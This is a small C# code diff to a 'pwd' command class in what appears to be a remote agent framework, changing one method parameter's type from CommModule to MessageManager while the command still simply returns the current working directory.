@@ -11,7 +11,7 @@ namespace Agent.Commands
     public class PrintWorkingDirectoryCommand : AgentCommand
     {
         public override string Name => "pwd";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             result.Result = Directory.GetCurrentDirectory();
         }
